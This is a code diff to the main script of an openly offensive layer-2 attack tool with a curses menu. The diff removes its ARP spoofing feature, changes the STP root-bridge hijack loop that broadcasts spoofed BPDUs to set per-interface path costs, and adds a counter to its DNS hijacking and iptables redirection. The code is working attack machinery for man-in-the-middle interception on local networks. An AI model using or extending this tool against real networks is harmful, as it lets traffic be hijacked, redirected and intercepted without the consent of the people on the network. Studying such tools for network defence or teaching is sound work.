@@ -6,7 +6,6 @@ import curses
 import json
 import ipaddress
 import create_bridge
-import arp_spoof
 import hijack_dns
 from types import SimpleNamespace
 from platform import system
@@ -36,6 +35,7 @@ choices = [getattr(getattr(attacks, attr), 'start', None) for attr in vars(attac
 verbose = config.verbose
 stdscr: Optional[curses.window] = None  # For GUI
 has_iptables = False
+dns_hijack_counter = 0
 stop_hijack_event = threading.Event()
 stop_dtp_event = threading.Event()
 system_interfaces = netifaces.interfaces()
@@ -48,20 +48,23 @@ banner = r""" (           (
 \__ \  | |  |  _/    / _ \  |  _||  _|/ _` |/ _| | / /  
 |___/  |_|  |_|     /_/ \_\  \__| \__|\__,_|\__| |_\_\  
 
-Authors: Jellyyyyyyy
+Authors: Jellyyyyyyy, Helihi
 Use Arrow keys to navigate and Enter to choose an option
 """
 
 
 def hijack(event, interfaces, pkt):
     pkt[0].src = attacks.hijack.settings.mac_address
-    pkt[0].pathcost = 1
     pkt[0].rootid = 0
     pkt[0].rootmac = attacks.hijack.settings.mac_address
     pkt[0].bridgeid = 0
     pkt[0].bridgemac = attacks.hijack.settings.mac_address
     while not event.is_set():
         for interface in interfaces:
+            if interface == interfaces[0]:
+                pkt[0].pathcost = attacks.hijack.settings.interface1_pathcost
+            elif interface == interfaces[1]:
+                pkt[0].pathcost = attacks.hijack.settings.interface2_pathcost
             sendp(pkt[0], loop=0, verbose=0, iface=interface)
         sleep(attacks.hijack.settings.interval)
 
@@ -81,28 +84,21 @@ def disable_forwarding(bridge_name: str):
     create_bridge.stop(bridge_name, verbose=verbose)
 
 
-def enable_arp_spoof(interfaces):
-    arp_spoof.start(interfaces, verbose=verbose)
-
-
-def disable_arp_spoof():
-    arp_spoof.stop(verbose=verbose)
-
-
 def enable_dns_hijack(fakeip, interfaces):
-    global has_iptables
-    hijack_dns.start(fakeip, interfaces, verbose=verbose)
+    global has_iptables, dns_hijack_counter
+    hijack_dns.start(fakeip, interfaces, dns_hijack_counter, verbose=verbose)
     if config.use_iptables:
         hijack_dns.iptables("create")
         has_iptables = True
 
 
 def disable_dns_hijack():
-    global has_iptables
-    hijack_dns.stop(verbose=verbose)
+    global has_iptables, dns_hijack_counter
+    hijack_dns.stop(dns_hijack_counter, verbose=verbose)
     if config.use_iptables:
         hijack_dns.iptables("remove")
         has_iptables = False
+    dns_hijack_counter += 1
 
 
 def display_banner(extra=""):
@@ -260,16 +256,6 @@ def gui(stdscr_gui):
             disable_forwarding(attacks.forward.settings.bridge_name)
             replace_choice(attacks.forward.stop, attacks.forward.start)
             stdscr_gui.addstr(f"\nDisabled packet forwarding. Press any key to return\n")
-
-        elif action == attacks.arp.start:
-            enable_arp_spoof(selected_interfaces)
-            replace_choice(attacks.arp.start, attacks.arp.stop)
-            stdscr_gui.addstr(f"\nEnabled ARP spoofing on {', '.join(selected_interfaces)}. Press any key to return\n")
-
-        elif action == attacks.arp.stop:
-            disable_arp_spoof()
-            replace_choice(attacks.arp.stop, attacks.arp.start)
-            stdscr_gui.addstr(f"\nDisabled ARP spoofing. Press any key to return\n")
 
         elif action == attacks.dns.start:
             interfaces_str = display.replace('\nChoose what to do', '')
